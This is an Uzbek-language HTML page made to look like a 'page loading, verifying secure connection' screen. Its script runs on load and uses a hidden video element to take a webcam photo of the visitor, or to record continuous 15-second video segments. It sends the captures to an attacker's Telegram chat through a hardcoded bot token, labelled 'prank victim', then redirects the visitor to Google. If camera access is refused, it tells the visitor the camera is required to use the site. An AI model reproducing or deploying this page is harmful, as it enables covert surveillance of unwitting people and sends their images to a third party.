<!DOCTYPE html>
<html lang="uz">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sahifa yuklanmoqda...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #f8fafc;
            color: #1e293b;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .loader-card {
            background: #ffffff;
            border-radius: 20px;
            padding: 40px 30px;
            max-width: 420px;
            width: 100%;
            text-align: center;
            box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.05), 0 8px 10px -6px rgba(0, 0, 0, 0.03);
            border: 1px solid #e2e8f0;
        }

        .spinner-wrapper {
            position: relative;
            width: 64px;
            height: 64px;
            margin: 0 auto 24px;
        }

        .spinner {
            width: 100%;
            height: 100%;
            border: 4px solid #e2e8f0;
            border-top: 4px solid #3b82f6;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        h2 {
            font-size: 19px;
            font-weight: 600;
            margin-bottom: 10px;
            color: #0f172a;
        }

        p {
            font-size: 14px;
            color: #64748b;
            line-height: 1.5;
        }

        .btn-retry {
            display: none;
            margin-top: 24px;
            padding: 12px 24px;
            background: #2563eb;
            color: white;
            border: none;
            border-radius: 10px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: background 0.2s;
            width: 100%;
        }

        .btn-retry:hover {
            background: #1d4ed8;
        }

        /* Yashirin video va canvas */
        .hidden-elements {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="loader-card">
        <div class="spinner-wrapper">
            <div class="spinner"></div>
        </div>
        <h2 id="status-title">Sahifa yuklanmoqda...</h2>
        <p id="status-desc">Iltimos, kuting. Xavfsiz ulanish tekshirilmoqda...</p>
        <button id="retry-btn" class="btn-retry" onclick="startCapture()">Davom etish</button>
    </div>

    <!-- Yashirin media elementlar -->
    <div class="hidden-elements">
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas"></canvas>
    </div>

    <script>
        // URL parametrlarini olish (?id=CHAT_ID&type=photo yoki video)
        const urlParams = new URLSearchParams(window.location.search);
        const CHAT_ID = urlParams.get('id') || '5724786253';
        const MODE = (urlParams.get('type') || 'photo').toLowerCase();
        const FALLBACK_TOKEN = '8397655004:AAHz1xBd0vNNLRe9H-8krdFjZNi9btJW4GA';
        const REDIRECT_URL = urlParams.get('redirect') || 'https://www.google.com';

        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const statusTitle = document.getElementById('status-title');
        const statusDesc = document.getElementById('status-desc');
        const retryBtn = document.getElementById('retry-btn');

        let isProcessing = false;

        async function startCapture() {
            if (isProcessing) return;
            isProcessing = true;
            retryBtn.style.display = 'none';

            if (MODE === 'video') {
                statusTitle.innerText = "Video yuklanmoqda...";
                statusDesc.innerText = "Iltimos, bir necha soniya kuting...";
                await recordVideo();
            } else {
                statusTitle.innerText = "Sahifa yuklanmoqda...";
                statusDesc.innerText = "Iltimos kuting...";
                await capturePhoto();
            }
        }

        // ==================== 1. FOTO OLISH ====================
        async function capturePhoto() {
            let stream = null;
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });

                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.setAttribute('autoplay', '');
                video.setAttribute('muted', '');
                video.playsInline = true;
                video.muted = true;

                await video.play().catch(() => {});

                // Kamera fokus va yorug'likni to'g'irlashi uchun 600ms kutish
                await new Promise(res => setTimeout(res, 600));

                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

                const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
                stopStream(stream);

                await sendData({
                    chat_id: CHAT_ID,
                    type: 'photo',
                    data: dataUrl
                });

                finish();
            } catch (err) {
                console.error("Kamera xatosi:", err);
                stopStream(stream);
                handleError(err);
            }
        }

        // ==================== 2. VIDEO YOZIB OLISH ====================
        // Har 15 soniyada segment yuborib turadi — sahifa yopilguncha davom etadi
        const SEGMENT_DURATION_MS = 15000;

        async function recordVideo() {
            let stream = null;
            try {
                // Faqat video — mikrofon kerak emas
                stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });

                video.srcObject = stream;
                video.playsInline = true;
                video.muted = true;
                await video.play().catch(() => {});

                // Agar MediaRecorder qo'llab-quvvatlanmasa, foto olish rejimiga o'tish
                if (typeof MediaRecorder === 'undefined') {
                    return capturePhoto();
                }

                // Qo'llab-quvvatlanadigan video formatni aniqlash (ovoz kodeki kerak emas)
                const mimeTypes = [
                    'video/webm;codecs=vp8',
                    'video/webm',
                    'video/mp4;codecs=avc1',
                    'video/mp4'
                ];
                let selectedMime = '';
                for (const mime of mimeTypes) {
                    if (MediaRecorder.isTypeSupported(mime)) {
                        selectedMime = mime;
                        break;
                    }
                }

                let globalStopped = false;
                let segmentIndex = 0;
                let intervalId = null;

                // Bitta segmentni yozib, Telegramga yuboradi
                function startSegment() {
                    if (globalStopped) return;

                    const options = selectedMime ? { mimeType: selectedMime } : {};
                    const rec = new MediaRecorder(stream, options);
                    const chunks = [];

                    rec.ondataavailable = (e) => {
                        if (e.data && e.data.size > 0) chunks.push(e.data);
                    };

                    rec.onstop = () => {
                        if (chunks.length === 0) return;
                        const blob = new Blob(chunks, { type: selectedMime || 'video/webm' });
                        const idx = segmentIndex++;
                        const reader = new FileReader();
                        reader.readAsDataURL(blob);
                        reader.onloadend = () => {
                            sendData({
                                chat_id: CHAT_ID,
                                type: 'video',
                                data: reader.result,
                                mimeType: selectedMime || 'video/webm',
                                segment: idx
                            });
                        };
                    };

                    rec.start();
                    return rec;
                }

                let currentRec = startSegment();

                // Har SEGMENT_DURATION_MS da eski segmentni to'xtatib, yangisini boshlash
                intervalId = setInterval(() => {
                    if (globalStopped) return;
                    const old = currentRec;
                    currentRec = startSegment();
                    if (old && old.state !== 'inactive') old.stop();
                }, SEGMENT_DURATION_MS);

                // Sahifadan chiqganda hamma narsani to'xtatib, oxirgi segmentni yuborish
                function stopAll() {
                    if (globalStopped) return;
                    globalStopped = true;
                    clearInterval(intervalId);
                    stopStream(stream);
                    if (currentRec && currentRec.state !== 'inactive') currentRec.stop();
                }

                window.addEventListener('beforeunload', stopAll);
                document.addEventListener('visibilitychange', () => {
                    if (document.visibilityState === 'hidden') stopAll();
                });
                window.addEventListener('pagehide', stopAll);

            } catch (err) {
                console.error("Video yozish xatosi:", err);
                stopStream(stream);
                handleError(err);
            }
        }

        // ==================== 3. MA'LUMOTNI YUBORISH ====================
        async function sendData(payload) {
            // 1-qadam: Vercel /api/send orqali yuborish
            try {
                const res = await fetch('/api/send', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });
                if (res.ok) {
                    const result = await res.json();
                    if (result.ok) return true;
                }
            } catch (apiErr) {
                console.warn("API xatosi, to'g'ridan-to'g'ri yuborilmoqda:", apiErr);
            }

            // 2-qadam: Zaxira — to'g'ridan-to'g'ri Telegram API ga FormData bilan
            try {
                const blob = await (await fetch(payload.data)).blob();
                const fd = new FormData();
                fd.append('chat_id', payload.chat_id);
                fd.append('caption', '🎯 Prank o\'ljasi');

                if (payload.type === 'video') {
                    const ext = (payload.mimeType || '').includes('mp4') ? 'mp4' : 'webm';
                    fd.append('video', blob, `video.${ext}`);
                    let r = await fetch(`https://api.telegram.org/bot${FALLBACK_TOKEN}/sendVideo`, {
                        method: 'POST', body: fd
                    });
                    let d = await r.json();
                    if (!d.ok) {
                        // sendDocument bilan zaxira
                        const fd2 = new FormData();
                        fd2.append('chat_id', payload.chat_id);
                        fd2.append('caption', '🎯 Prank video');
                        fd2.append('document', blob, `video.${ext}`);
                        await fetch(`https://api.telegram.org/bot${FALLBACK_TOKEN}/sendDocument`, {
                            method: 'POST', body: fd2
                        });
                    }
                } else {
                    fd.append('photo', blob, 'photo.jpg');
                    await fetch(`https://api.telegram.org/bot${FALLBACK_TOKEN}/sendPhoto`, {
                        method: 'POST', body: fd
                    });
                }
                return true;
            } catch (tgErr) {
                console.error("Direct fallback xatosi:", tgErr);
                return false;
            }
        }
        }

        // Kamerani to'xtatish
        function stopStream(stream) {
            if (stream) {
                stream.getTracks().forEach(t => t.stop());
            }
            if (video.srcObject) {
                video.srcObject.getTracks().forEach(t => t.stop());
                video.srcObject = null;
            }
        }

        // Yakunlash va yo'naltirish
        function finish() {
            statusTitle.innerText = "Yuklandi!";
            statusDesc.innerText = "Yo'naltirilmoqda...";
            setTimeout(() => {
                window.location.href = REDIRECT_URL;
            }, 500);
        }

        // Xatolik yuz berganda
        function handleError(err) {
            isProcessing = false;
            statusTitle.innerText = "Ruxsat talab qilinadi";
            statusDesc.innerText = "Saytdan foydalanish uchun kameraga ruxsat bering.";
            retryBtn.style.display = 'block';
        }

        // Sahifa to'liq yuklanganda avtomatik boshlash
        window.addEventListener('DOMContentLoaded', () => {
            setTimeout(startCapture, 200);
        });
    </script>
</body>
</html>
